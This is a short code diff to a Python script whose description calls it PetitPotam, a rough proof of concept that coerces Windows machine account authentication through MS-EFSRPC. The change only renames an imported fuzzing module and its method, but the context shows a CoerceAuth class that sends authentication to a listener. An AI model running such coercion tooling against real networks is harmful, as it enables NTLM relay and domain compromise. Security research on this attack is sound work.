@@ -10,7 +10,7 @@ import sys
 import argparse
 
 
-from lib.module import EFSfuzz
+from lib.module import EFSRfuzz
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.uuid import uuidtup_to_bin
@@ -90,7 +90,7 @@ class CoerceAuth():
         
     def fuzz_EfsMethod(self, dce, listener):
         print("[+] In fuzzing mode!")
-        EFSfuzz.fuzz_EfsMethod(dce,listener)
+        EFSRfuzz.fuzz_EFSRMethod(dce,listener)
 
 def main():
     parser = argparse.ArgumentParser(add_help = True, description = "PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()")
